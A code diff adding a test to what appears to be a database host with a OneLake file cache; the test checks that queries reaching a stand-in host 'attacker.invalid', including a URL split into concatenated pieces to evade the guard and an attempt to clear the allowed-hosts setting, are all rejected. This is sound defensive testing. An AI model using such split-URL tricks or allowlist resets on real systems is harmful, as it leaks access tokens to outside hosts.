@@ -271,6 +271,25 @@ test("offline with the disk cache: what it doesn't keep says so at once, with no
   assert.equal((await engine.call("query", ["SELECT 42 AS a"])).rows[0].a, 42);
 });
 
+test("the OneLake token goes to OneLake: a URL joined up from pieces is refused where it is read", { skip: !existsSync(CACHE_BUILD) }, async t => {
+  const extDir = await mkdtemp(join(tmpdir(), "onelake-ext-"));
+  const cacheDir = await mkdtemp(join(tmpdir(), "onelake-cache-"));
+  const engine = createEngineHost({ extensionDir: extDir, bundledExtensions: BUNDLED, fileCacheDir: cacheDir, fileCacheMaxBytes: 1024 ** 3 });
+  t.after(async () => {
+    await engine.close();
+    await rm(extDir, { recursive: true, force: true }).catch(() => {});
+    await rm(cacheDir, { recursive: true, force: true }).catch(() => {});
+  });
+  // Written whole, the guard reads it.
+  await assert.rejects(engine.call("query", ["SELECT * FROM read_text('abfss://x@attacker.invalid/y.txt')"]), /attacker\.invalid is not OneLake/);
+  // Joined up, the disk cache does.
+  await assert.rejects(engine.call("query", ["SELECT * FROM read_text('abfss://x@attacker' || '.invalid/y.txt')"]), /attacker\.invalid is not a host this database may reach/);
+  await assert.rejects(engine.call("query", ["SELECT * FROM glob('abfss://x@attacker' || '.invalid/*')"]), /attacker\.invalid is not a host this database may reach/);
+  // The lockdown holds it there.
+  await assert.rejects(engine.call("query", ["SET cache_httpfs_allowed_azure_hosts = ''"]), /Read only/);
+  assert.equal((await engine.call("info", [])).capabilities.fileCache, true);
+});
+
 test("the internet going during a read is checked once, and the statement runs again from what is kept", { skip: !existsSync(CACHE_BUILD) }, async t => {
   const extDir = await mkdtemp(join(tmpdir(), "onelake-ext-"));
   const cacheDir = await mkdtemp(join(tmpdir(), "onelake-cache-"));
